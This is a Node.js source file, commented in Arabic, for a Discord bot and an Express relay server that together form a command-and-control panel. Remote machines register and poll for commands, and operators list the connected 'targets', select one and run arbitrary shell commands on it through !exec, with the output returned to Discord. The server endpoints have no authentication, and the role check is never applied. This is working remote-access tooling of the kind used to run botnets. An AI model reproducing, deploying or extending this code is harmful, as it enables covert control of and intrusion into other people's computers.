const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const { exec, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ===== الإعدادات =====
const TOKEN = process.env.BOT_TOKEN;
const PREFIX = '!';
const ROOM_ID = process.env.ROOM_ID || null;
const PORT = process.env.PORT || 3000;

// ===== خادم Express (الوسيط) =====
const app = express();
app.use(bodyParser.json());

// تخزين الأوامر المعلقة لكل عميل
const pendingCommands = {}; // { clientId: [ { id, cmd } ] }
const commandResults = {};
let cmdCounter = 0;

// تخزين الأجهزة المتصلة (التسجيل)
const clients = {}; // { clientId: { hostname, lastSeen } }

// ===== نقاط نهاية الخادم =====
// تسجيل العميل
app.post('/register', (req, res) => {
    const { clientId, hostname } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
    clients[clientId] = { hostname: hostname || 'Unknown', lastSeen: Date.now() };
    console.log(`📥 جهاز جديد مسجل: ${clientId} (${hostname})`);
    res.json({ status: 'registered' });
});

// تحديث وقت آخر اتصال (يُستخدم مع polling)
app.get('/poll/:clientId', (req, res) => {
    const clientId = req.params.clientId;
    // تحديث lastSeen
    if (clients[clientId]) clients[clientId].lastSeen = Date.now();
    const list = pendingCommands[clientId] || [];
    if (list.length === 0) return res.status(204).send();
    const cmdObj = list.shift();
    res.json({ id: cmdObj.id, command: cmdObj.cmd });
});

app.post('/result', (req, res) => {
    const { id, result } = req.body;
    commandResults[id] = result;
    res.json({ status: 'ok' });
});

app.post('/send', (req, res) => {
    const { clientId, command } = req.body;
    if (!clientId || !command) return res.status(400).json({ error: 'Missing data' });
    const id = ++cmdCounter;
    if (!pendingCommands[clientId]) pendingCommands[clientId] = [];
    pendingCommands[clientId].push({ id, cmd: command });
    res.json({ status: 'queued', id });
});

app.get('/result/:id', (req, res) => {
    const result = commandResults[req.params.id];
    if (result) res.json({ result });
    else res.status(404).json({ error: 'Not found' });
});

// قائمة الأجهزة المتصلة (للبوت)
app.get('/clients', (req, res) => {
    const now = Date.now();
    const online = {};
    for (const [id, data] of Object.entries(clients)) {
        // نعتبر الجهاز متصلاً إذا كان آخر اتصال خلال 30 ثانية
        if (now - data.lastSeen < 30000) {
            online[id] = data;
        }
    }
    res.json(online);
});

// ===== بوت ديسكورد =====
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// تخزين الهدف المختار لكل مستخدم
const userTargets = new Map(); // userId -> clientId

// دوال اختيارية (للتنفيذ المحلي لكننا نفضل الأوامر عن بعد)
function execCommand(cmd) {
    try { return execSync(cmd, { encoding: 'utf8', timeout: 5000 }) || 'تم التنفيذ'; }
    catch(err) { return `خطأ: ${err.message}`; }
}

function isAuthorized(member) {
    if (!ROOM_ID) return true;
    return member.roles.cache.has(ROOM_ID);
}

// ===== أوامر البوت =====
client.on('messageCreate', async (msg) => {
    if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
    const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

    // ---- أمر عرض الأجهزة المتصلة ----
    if (cmd === 'list' || cmd === 'clients') {
        try {
            const response = await fetch(`http://localhost:${PORT}/clients`);
            const data = await response.json();
            const entries = Object.entries(data);
            if (entries.length === 0) {
                return msg.reply('❌ لا توجد أجهزة متصلة حالياً.');
            }
            let listMsg = '📡 **الأجهزة المتصلة:**\n';
            entries.forEach(([id, info]) => {
                listMsg += `🖥️ \`${id}\` (${info.hostname}) - آخر اتصال: ${new Date(info.lastSeen).toLocaleTimeString()}\n`;
            });
            listMsg += '\nاستخدم `!use <المعرف>` لاختيار جهاز، ثم `!exec <أمر>`.';
            await msg.reply(listMsg);
        } catch (err) {
            await msg.reply(`❌ خطأ في جلب الأجهزة: ${err.message}`);
        }
        return;
    }

    // ---- أمر اختيار الهدف ----
    if (cmd === 'use' || cmd === 'select') {
        const targetId = args[0];
        if (!targetId) return msg.reply('⚠️ اكتب: `!use <المعرف>`');
        // تحقق من أن هذا المعرف موجود في قائمة الأجهزة
        try {
            const response = await fetch(`http://localhost:${PORT}/clients`);
            const data = await response.json();
            if (!data[targetId]) {
                return msg.reply(`❌ المعرف \`${targetId}\` غير موجود أو غير متصل. استخدم \`!list\` لعرض المتصلين.`);
            }
            userTargets.set(msg.author.id, targetId);
            await msg.reply(`✅ تم اختيار الجهاز \`${targetId}\` (${data[targetId].hostname}). الآن استخدم \`!exec <أمر>\` للتحكم به.`);
        } catch (err) {
            await msg.reply(`❌ خطأ: ${err.message}`);
        }
        return;
    }

    // ---- أمر تنفيذ الأمر على الهدف المختار ----
    if (cmd === 'exec' || cmd === 'run') {
        const targetId = userTargets.get(msg.author.id);
        if (!targetId) {
            return msg.reply('⚠️ لم تختار أي جهاز بعد. استخدم `!list` لعرض الأجهزة، ثم `!use <المعرف>` لاختيار واحد.');
        }
        const fullCmd = args.join(' ');
        if (!fullCmd) return msg.reply('اكتب الأمر المراد تنفيذه (مثال: `!exec dir C:\\`)');
        try {
            const response = await fetch(`http://localhost:${PORT}/send`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId: targetId, command: fullCmd })
            });
            const data = await response.json();
            await msg.reply(`✅ تم إرسال الأمر. المعرف: \`${data.id}\``);
            // ننتظر 5 ثوانٍ لاستلام النتيجة
            await new Promise(resolve => setTimeout(resolve, 5000));
            const resResult = await fetch(`http://localhost:${PORT}/result/${data.id}`);
            if (resResult.ok) {
                const json = await resResult.json();
                await msg.reply(`📦 **النتيجة من ${targetId}:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply(`⏳ لم تصل النتيجة بعد. حاول \`!result ${data.id}\` لاحقاً.`);
            }
        } catch (err) {
            await msg.reply(`❌ فشل الإرسال: ${err.message}`);
        }
        return;
    }

    // ---- أمر جلب نتيجة محددة ----
    if (cmd === 'result') {
        const id = args[0];
        if (!id) return msg.reply('اكتب: `!result <رقم_المعرف>`');
        try {
            const res = await fetch(`http://localhost:${PORT}/result/${id}`);
            if (res.ok) {
                const json = await res.json();
                await msg.reply(`📦 **النتيجة:**\n\`\`\`\n${json.result.slice(0, 1900)}\n\`\`\``);
            } else {
                await msg.reply('❌ لم يتم العثور على النتيجة أو انتهت صلاحيتها.');
            }
        } catch(err) { await msg.reply('خطأ في الاستعلام'); }
        return;
    }

    // ---- أوامر عامة (اختيارية) ----
    if (cmd === 'ping') return msg.reply(`Pong! ${client.ws.ping}ms`);
    if (cmd === 'help') {
        return msg.reply(`
**📋 قائمة الأوامر:**
\`!list\` – عرض الأجهزة المتصلة
\`!use <المعرف>\` – اختيار جهاز للتحكم به
\`!exec <أمر>\` – تنفيذ أمر على الجهاز المختار
\`!result <id>\` – جلب نتيجة أمر سابق
\`!ping\` – اختبار الاتصال
        `);
    }
});

client.once('ready', () => {
    console.log(`✅ البوت يعمل باسم ${client.user.tag}`);
    console.log(`🌐 الخادم الوسيط على المنفذ ${PORT}`);
});

client.login(TOKEN);

// تشغيل الخادم
app.listen(PORT, '0.0.0.0', () => console.log(`✅ Relay server running on port ${PORT}`));
